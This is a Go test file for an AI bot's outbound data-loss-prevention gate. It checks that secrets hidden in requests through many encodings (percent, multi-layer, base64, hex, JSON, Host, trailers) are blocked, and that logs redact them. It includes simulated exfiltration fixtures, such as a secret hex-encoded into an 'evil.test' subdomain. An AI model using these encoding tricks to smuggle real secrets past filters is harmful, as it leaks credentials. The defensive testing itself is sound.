package netx

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"maps"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/damnbot/damnbot/internal/netx/retry"
	"github.com/damnbot/damnbot/internal/testutil/timing"
)

// reservedValue holds every URL/HTML/JSON-reserved byte class (NETX-5).
const reservedValue = `a/b+c=d&e<f>"g h%i?j#k`

// pctAll percent-encodes every byte; lower selects lowercase hex.
func pctAll(s string, lower bool) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		h := fmt.Sprintf("%%%02X", c)
		if lower {
			h = strings.ToLower(h)
		}
		b.WriteString(h)
	}
	return b.String()
}

// encodings are the transformations the gate must see through; each maps
// the secret to a string a server would decode back to it.
func encodings() map[string]func(string) string {
	return map[string]func(string) string{
		"raw":           func(s string) string { return s },
		"pct-canonical": url.QueryEscape,
		"pct-path":      url.PathEscape,
		"pct-all":       func(s string) string { return pctAll(s, false) },
		"pct-lower":     func(s string) string { return pctAll(s, true) },
		"pct-double":    func(s string) string { return url.QueryEscape(url.QueryEscape(s)) },
		"pct-triple":    func(s string) string { return url.QueryEscape(url.QueryEscape(url.QueryEscape(s))) },
		"base64":        func(s string) string { return base64.StdEncoding.EncodeToString([]byte("x:" + s + ";")) },
		"base64url":     func(s string) string { return base64.URLEncoding.EncodeToString([]byte("ab" + s)) },
		"base64-mime": func(s string) string {
			e := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("pad", 20) + s))
			return e[:40] + "\r\n" + e[40:]
		},
		"hex":       func(s string) string { return hex.EncodeToString([]byte(s)) },
		"hex-upper": func(s string) string { return strings.ToUpper(hex.EncodeToString([]byte(s))) },
		"hex-mixed": func(s string) string {
			h := []byte(hex.EncodeToString([]byte(s)))
			for i := 0; i < len(h); i += 2 {
				h[i] = strings.ToUpper(string(h[i]))[0]
			}
			return string(h)
		},
		"json": func(s string) string {
			b, err := json.Marshal(map[string]string{"k": s})
			if err != nil {
				return "<marshal error>"
			}
			return string(b)
		},
	}
}

// locations put an encoded value somewhere a request carries it; ok=false
// when the encoding cannot appear there verbatim (e.g. CR/LF in a header).
func locations(base string) map[string]func(enc string) (*http.Request, bool) {
	mk := func(method, u, body string, hdr http.Header) (*http.Request, bool) {
		var r io.Reader
		if body != "" {
			r = strings.NewReader(body)
		}
		req, err := http.NewRequest(method, u, r) //nolint:noctx // never sent
		if err != nil {
			return nil, false
		}
		maps.Copy(req.Header, hdr)
		return req, true
	}
	return map[string]func(string) (*http.Request, bool){
		"query": func(e string) (*http.Request, bool) { return mk(http.MethodGet, base+"/s?q="+e, "", nil) },
		"path":  func(e string) (*http.Request, bool) { return mk(http.MethodGet, base+"/p/"+e, "", nil) },
		"form-body": func(e string) (*http.Request, bool) {
			return mk(http.MethodPost, base, "a=1&note="+e, http.Header{"Content-Type": {"application/x-www-form-urlencoded"}})
		},
		"json-body": func(e string) (*http.Request, bool) { return mk(http.MethodPost, base, `{"text":"`+e+`"}`, nil) },
		"header": func(e string) (*http.Request, bool) {
			if strings.ContainsAny(e, "\r\n") {
				return nil, false
			}
			return mk(http.MethodGet, base, "", http.Header{"X-Trace": {e}})
		},
	}
}

// TestEgressDLP (GAP-SEC-16, NETX-2/5): a secret with reserved bytes in
// every location × encoding (incl. non-canonical percent-encoding) is
// blocked before a byte is sent; the request bytes never echo it.
func TestEgressDLP(t *testing.T) {
	t.Parallel()
	srv, conns := server(t, func(w http.ResponseWriter, _ *http.Request) { write(w, "ok") })
	vault := []string{reservedValue, "s3cr3t-Vault-Value-9f8e7d6c"}
	n := newNet(t, Config{Secrets: vault})
	fetch := n.Client("web_fetch", Tool)
	for _, sec := range vault {
		for ln, loc := range locations(srv.URL) {
			for en, enc := range encodings() {
				req, ok := loc(enc(sec))
				if !ok {
					continue
				}
				t.Run(fmt.Sprintf("web_fetch/%s/%s/%d", ln, en, len(sec)), func(t *testing.T) {
					wantBlocked(t, fetch, req, sec, srv.Listener.Addr().String())
				})
			}
		}
	}
	for _, u := range []string{srv.URL + "/?k=ghp_" + strings.Repeat("a", 36), "http://" + hex.EncodeToString([]byte(vault[1])) + ".evil.test/"} {
		resp, err := fetch.Do(toolReq(t, http.MethodGet, u, "", nil))
		closeBody(t, resp)
		if !errors.Is(err, ErrSecretEgress) {
			t.Errorf("%s: %v", u, err)
		}
	}
	if conns.Load() != 0 {
		t.Fatalf("%d connections opened for blocked requests", conns.Load())
	}
	resp, err := fetch.DoOK(toolReq(t, http.MethodPost, srv.URL+"/search?q=go+generics%20%2Bplus", `{"q":"hello & <b>"}`, nil))
	if err != nil {
		t.Fatalf("clean request: %v", err)
	}
	if err := resp.Body.Close(); err != nil {
		t.Fatal(err)
	}
}

// wantBlocked asserts req is refused as secret_egress without echoing the
// secret or the target address.
func wantBlocked(t *testing.T, c *Client, req *http.Request, secret, addr string) {
	t.Helper()
	resp, err := c.Do(req.WithContext(t.Context()))
	closeBody(t, resp)
	if !errors.Is(err, ErrSecretEgress) || retry.ClassifyErr(err) != retry.BadRequest {
		t.Fatalf("not blocked: %v", err)
	}
	if strings.Contains(err.Error(), secret) || strings.Contains(err.Error(), addr) {
		t.Errorf("error echoes the request: %v", err)
	}
}

func toolReq(t *testing.T, method, rawURL, body string, hdr map[string]string) *http.Request {
	t.Helper()
	var r io.Reader
	if body != "" {
		r = strings.NewReader(body)
	}
	req, err := http.NewRequestWithContext(t.Context(), method, rawURL, r)
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	return req
}

// TestDLPWire (NETX-6/7/10/11): Host and trailers are scanned; the body
// is read once and the scanned bytes are sent; an oversized body, a zero
// purpose, and secrets added later are handled fail-closed.
func TestDLPWire(t *testing.T) {
	t.Parallel()
	var got []byte
	srv, _ := server(t, func(_ http.ResponseWriter, r *http.Request) { got, _ = io.ReadAll(r.Body) }) //nolint:errcheck // asserted below
	n := newNet(t, Config{Secrets: []string{"0123456789abcdef"}})
	fetch := n.Client("web_fetch", Tool)
	hostReq := toolReq(t, http.MethodGet, srv.URL, "", nil)
	hostReq.Host = "0123456789abcdef.example"
	trailerReq := toolReq(t, http.MethodPost, srv.URL, "x", nil)
	trailerReq.Trailer = http.Header{"X-T": {"0123456789ABCDEF"}}
	big := toolReq(t, http.MethodPost, srv.URL, "", nil)
	big.Body = io.NopCloser(io.LimitReader(zeros{}, dlpMaxBody+1))
	for name, c := range map[string]struct {
		req  *http.Request
		want error
	}{"host": {hostReq, ErrSecretEgress}, "trailer": {trailerReq, ErrSecretEgress}, "big": {big, ErrDLPLimit}} {
		resp, err := fetch.Do(c.req)
		closeBody(t, resp)
		if !errors.Is(err, c.want) {
			t.Errorf("%s: %v", name, err)
		}
	}
	once := toolReq(t, http.MethodPost, srv.URL, "", nil)
	once.Body, once.GetBody = io.NopCloser(strings.NewReader("payload")), nil // not rewindable
	resp, err := fetch.DoOK(once)
	if err != nil || string(got) != "payload" {
		t.Fatalf("scanned body not sent: %q %v", got, err)
	}
	closeBody2(t, resp)
	resp, err = n.Client("x", 0).Do(toolReq(t, http.MethodGet, srv.URL, "", nil))
	closeBody(t, resp)
	if !errors.Is(err, ErrPurpose) {
		t.Errorf("zero purpose: %v", err)
	}
	n.SetSecrets([]string{"rotated-token-value"})
	resp, err = fetch.Do(toolReq(t, http.MethodGet, srv.URL+"/?t=rotated-token-value", "", nil))
	closeBody(t, resp)
	if !errors.Is(err, ErrSecretEgress) {
		t.Errorf("rotated secret: %v", err)
	}
}

type zeros struct{}

func (zeros) Read(p []byte) (int, error) { clear(p); return len(p), nil }

func closeBody2(t *testing.T, resp *http.Response) {
	t.Helper()
	if err := resp.Body.Close(); err != nil {
		t.Error(err)
	}
}

func TestSecretForms(t *testing.T) {
	t.Parallel()
	d := newDLP([]string{"s3cr3t-Vault-Value", "ab"})
	for pre := range 5 {
		blob := strings.Repeat("z", pre) + "s3cr3t-Vault-Value" + "tail"
		for _, enc := range []*base64.Encoding{base64.StdEncoding, base64.URLEncoding, base64.RawStdEncoding} {
			if err := d.scan([]byte(enc.EncodeToString([]byte(blob)))); !errors.Is(err, ErrSecretEgress) {
				t.Errorf("base64 at offset %d (%v) not found", pre, enc)
			}
		}
	}
	if err := d.scan([]byte("x ab y")); !errors.Is(err, ErrSecretEgress) {
		t.Errorf("short raw secret not found: %v", err)
	}
	if err := d.scan([]byte("YWI=")); err != nil { // base64("ab"): too short to match encoded
		t.Errorf("short secret matched in base64 form: %v", err)
	}
	if got := alignedBase64(base64.StdEncoding, "abc", 2); got != "" {
		t.Errorf("no full group expected, got %q", got)
	}
	if got := string(pctDecode(nil, []byte("%2f%2F+%zz%4"))); got != "// %zz%4" {
		t.Errorf("pctDecode = %q", got)
	}
}

// dlpBody8K is an 8 KiB web_fetch-style body (prose + an embedded hex
// dump) with no secret, or an adversarial body: "prefix" collides with the
// shared form prefix at every position, "decode" forces every decoding
// layer and the CR/LF variant of each.
func dlpBody8K(kind string) []byte {
	if kind == "decode" {
		return bytes.Repeat([]byte("%252525+\r\nAa"), 8<<10/12+1)[:8<<10]
	}
	if kind == "prefix" {
		// Every 8-byte window collides with the shared prefix of the hex
		// forms: maximal verification work.
		return bytes.Repeat([]byte(hex.EncodeToString([]byte("tok_prefix"))[:8]), 1024)
	}
	var b bytes.Buffer
	for b.Len() < 8<<10 {
		b.WriteString("The quick brown fox jumps over the lazy dog; ")
		b.WriteString(hex.EncodeToString([]byte(fmt.Sprint(b.Len()))))
	}
	return b.Bytes()[:8<<10]
}

// dlpSecrets returns n distinct secrets sharing a prefix (worst case for
// the prefix index).
func dlpSecrets(n int) []string {
	out := make([]string, n)
	for i := range out {
		out[i] = fmt.Sprintf("tok_prefix_%04d_%s", i, strings.Repeat("Q", 24))
	}
	return out
}

// dlpBudgetMinRuns is the iteration count from which BenchmarkDLPScan
// asserts its budget (make perf runs 100).
const dlpBudgetMinRuns = 100

// dlpBudget is GAP-SEC-16's ≤ 50 µs per 8 KiB request; adversarial
// bodies are bounded at 3× by the work cap (fail-closed beyond it).
func dlpBudget(kind string) time.Duration {
	if kind == "plain" {
		return 50 * time.Microsecond
	}
	return 150 * time.Microsecond
}

// BenchmarkDLPScan (GAP-SEC-16, NETX-3/13): gate cost for an 8 KiB request
// with 50 and 200 known secrets, plain and adversarial bodies. The budget
// is asserted in `make perf` (×1.5 on shared runners, ADR-077).
func BenchmarkDLPScan(b *testing.B) {
	for _, n := range []int{50, 200} {
		for _, kind := range []string{"plain", "prefix", "decode"} {
			b.Run(fmt.Sprintf("secrets=%d/%s", n, kind), func(b *testing.B) {
				d := newDLP(dlpSecrets(n))
				body := dlpBody8K(kind)
				b.SetBytes(int64(len(body)))
				b.ReportAllocs()
				for b.Loop() {
					if err := d.scan(body); err != nil && !errors.Is(err, ErrDLPLimit) {
						b.Fatal(err)
					}
				}
				// make test-timing runs every benchmark once (-benchtime=1x): a
				// cold single scan measures warm-up, not the gate; the budget is
				// asserted by make perf (-benchtime=100x).
				if b.N >= dlpBudgetMinRuns {
					timing.Check(b, fmt.Sprintf("DLP scan 8 KiB, %d secrets, %s (GAP-SEC-16)", n, kind), b.Elapsed()/time.Duration(b.N), dlpBudget(kind))
				}
			})
		}
	}
}

// TestDLPBounds (NETX-3): adversarial bodies end within the work caps:
// prefix collisions and multi-layer encodings fail closed, plain passes.
func TestDLPBounds(t *testing.T) {
	t.Parallel()
	d := newDLP(dlpSecrets(50))
	for kind, want := range map[string]error{"plain": nil, "prefix": ErrDLPLimit, "decode": ErrDLPLimit} {
		if err := d.scan(dlpBody8K(kind)); !errors.Is(err, want) || (want == nil) != (err == nil) {
			t.Errorf("%s: %v, want %v", kind, err, want)
		}
	}
	// Small multi-encoded spans stay within the cap: a triple-encoded
	// secret in a query is found, not refused.
	if err := d.scan([]byte("q=" + url.QueryEscape(url.QueryEscape(url.QueryEscape(dlpSecrets(1)[0]))))); !errors.Is(err, ErrSecretEgress) {
		t.Errorf("triple-encoded: %v", err)
	}
}

// TestLogMetadataOnly (ADR-071 butir 5, SPEC §15, NETX-4): DEBUG request
// lines carry metadata only, a redacted host/path, and nothing of a
// blocked request's URL.
func TestLogMetadataOnly(t *testing.T) {
	t.Parallel()
	var buf bytes.Buffer
	log := slog.New(slog.NewJSONHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug}))
	srv, _ := server(t, func(w http.ResponseWriter, _ *http.Request) { write(w, "RESPONSE-BODY") })
	const vaultSecret = "s3cr3t-Vault-Value-9f8e7d6c"
	n := newNet(t, Config{Secrets: []string{vaultSecret}, Log: log})
	tok := "123456789:" + strings.Repeat("A", 35) // Telegram bot token pattern
	resp, err := n.Client("telegram", Inference).DoOK(toolReq(t, http.MethodPost,
		srv.URL+"/bot"+tok+"/sendMessage?chat_id=QUERY-VALUE", "REQUEST-BODY", map[string]string{"X-H": "HEADER-VALUE"}))
	if err != nil {
		t.Fatal(err)
	}
	closeBody2(t, resp)
	host := hex.EncodeToString([]byte(vaultSecret)) + ".evil.test"
	resp, err = n.Client("web_fetch", Tool).Do(toolReq(t, http.MethodGet, "http://"+host+"/?q=x", "", nil))
	closeBody(t, resp)
	if !errors.Is(err, ErrSecretEgress) || strings.Contains(err.Error(), host) {
		t.Fatal(err)
	}
	out := buf.String()
	for _, leak := range []string{tok, "QUERY-VALUE", "REQUEST-BODY", "HEADER-VALUE", "RESPONSE-BODY", vaultSecret, host} {
		if strings.Contains(out, leak) {
			t.Errorf("log leaks %q:\n%s", leak, out)
		}
	}
	for _, want := range []string{`"egress":"telegram"`, `"status":200`, `"req_bytes":12`, `"class":"bad_request"`, "REDACTED", `"host":"[blocked]"`} {
		if !strings.Contains(out, want) {
			t.Errorf("log lacks %s:\n%s", want, out)
		}
	}
}
